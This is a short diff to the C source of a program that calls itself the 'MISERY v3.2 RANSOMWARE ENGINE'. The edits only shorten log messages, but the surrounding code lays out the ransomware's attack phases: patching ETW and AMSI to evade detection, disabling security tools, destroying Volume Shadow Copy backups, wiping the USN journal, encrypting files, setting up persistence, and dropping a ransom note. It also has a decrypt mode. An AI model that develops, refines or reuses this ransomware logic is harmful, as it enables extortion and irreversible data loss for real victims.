@@ -594,7 +594,7 @@ static bool ExecutePhaseAntiAnalysis(void) {
 }
 
 static bool ExecutePhaseDefensePatching(void) {
-    MiseryLog(MISERY_LOG_INFO, "Starting DEFENSE PATCHING phase...");
+    MiseryLog(MISERY_LOG_INFO, "Starting DEFENSE PATCHING phase");
     bool success = true;
     if (!DefensePatchETW())        { MiseryLog(MISERY_LOG_WARN, "ETW patch failed");  success = false; }
     if (!DefensePatchAMSI())       { MiseryLog(MISERY_LOG_WARN, "AMSI patch failed"); success = false; }
@@ -614,7 +614,7 @@ static bool ExecutePhaseSecurityDisable(void) {
 }
 
 static bool ExecutePhaseBackupDestroy(void) {
-    MiseryLog(MISERY_LOG_INFO, "Starting BACKUP DESTROY phase...");
+    MiseryLog(MISERY_LOG_INFO, "Starting BACKUP DESTROY phase");
     bool success = true;
     if (!UtilsNukeBackups())     { MiseryLog(MISERY_LOG_WARN, "VSS nuke failed");  success = false; }
     if (!UtilsWipeUSNJournal())  { MiseryLog(MISERY_LOG_WARN, "USN wipe failed");  success = false; }
@@ -622,7 +622,7 @@ static bool ExecutePhaseBackupDestroy(void) {
 }
 
 static bool ExecutePhaseEncryption(void) {
-    MiseryLog(MISERY_LOG_INFO, "Starting ENCRYPTION phase...");
+    MiseryLog(MISERY_LOG_INFO, "Starting ENCRYPTION phase");
     bool success = true;
 
     CRYPTO_CTX *crypto_ctx = GetCryptoCtx();
@@ -676,7 +676,7 @@ static bool ExecutePhasePeristence(void) {
 }
 
 static bool ExecutePhaseRansomNote(void) {
-    MiseryLog(MISERY_LOG_INFO, "Starting RANSOM NOTE phase...");
+    MiseryLog(MISERY_LOG_INFO, "Starting RANSOM NOTE phase.");
 
     /* Drop text note on desktop */
     const char *note_content =
@@ -716,14 +716,14 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    puts("========== MISERY v3.2 RANSOMWARE ENGINE ==========");
-    MiseryLog(MISERY_LOG_INFO, "=== MISERY INITIALIZATION ===");
+    puts("MISERY");
+    MiseryLog(MISERY_LOG_INFO, "Initialization");
 
     bool decryptmode = (argc > 1 && strcmp(argv[1], "-d") == 0);
 
     if (decryptmode) {
 
-        MiseryLog(MISERY_LOG_INFO, "Mode: COMMAND-LINE DECRYPT");
+        MiseryLog(MISERY_LOG_INFO, "Mode: COMMANDLINE DECRYPT");
 
         char keyfilePath[MAX_PATH * 2] = {0};
         FILE *kf = OpenKeyFile(keyfilePath, sizeof(keyfilePath));
@@ -845,7 +845,7 @@ int main(int argc, char **argv) {
 
     g_misery_ctx.executionTimeMs = GetTickCount() - start_time;
 
-    MiseryLog(MISERY_LOG_INFO, "=== EXECUTION COMPLETE ===");
+    MiseryLog(MISERY_LOG_INFO, "EXECUTION COMPLETE");
     MiseryReportStats();
     MiseryCleanupContext();
 
